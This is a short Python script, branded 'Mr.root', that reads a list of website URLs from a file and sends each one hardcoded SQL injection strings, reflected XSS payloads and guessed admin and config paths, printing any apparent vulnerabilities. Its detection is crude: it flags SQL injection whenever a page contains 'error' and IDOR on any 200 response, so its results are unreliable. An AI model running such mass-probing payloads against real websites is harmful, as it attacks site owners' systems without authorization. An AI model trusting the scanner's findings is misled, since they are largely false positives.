import requests
import pyfiglet
from termcolor import colored

# Define payloads for the vulnerabilities
sql_injection_payloads = ["' OR 1=1 --", "' OR 'a'='a", "1' OR 'a'='a", "1' OR 1=1"]
xss_payloads = ['<script>alert(1)</script>', '<img src="x" onerror="alert(1)">']
idor_payloads = ['/admin', '/config', '/user/profile']

# Function to print the Mr.root banner
def print_banner():
    ascii_banner = pyfiglet.figlet_format("Mr.root")
    print(colored(ascii_banner, 'cyan'))

# Function to test SQL Injection
def test_sql_injection(url):
    for payload in sql_injection_payloads:
        response = requests.get(url + payload)
        if "error" in response.text or "syntax" in response.text:
            print(colored(f"SQL Injection Vulnerability found at {url} with payload {payload}", "red"))

# Function to test XSS
def test_xss(url):
    for payload in xss_payloads:
        response = requests.get(url + payload)
        if payload in response.text:
            print(colored(f"XSS Vulnerability found at {url} with payload {payload}", "yellow"))

# Function to test IDOR
def test_idor(url):
    for payload in idor_payloads:
        response = requests.get(url + payload)
        if response.status_code == 200:
            print(colored(f"IDOR Vulnerability found at {url} with payload {payload}", "green"))

# Function to scan the website
def scan_website(url):
    print(colored(f"Scanning {url}...", 'blue'))
    test_sql_injection(url)
    test_xss(url)
    test_idor(url)

# Main function to scan websites from the list
def main():
    print_banner()
    try:
        with open("list.txt", "r") as file:
            urls = file.readlines()
        
        for url in urls:
            url = url.strip()
            if not url.startswith("http"):
                url = "http://" + url
            scan_website(url)
    except FileNotFoundError:
        print(colored("list.txt not found!", 'red'))

# Run the script
if __name__ == "__main__":
    main()
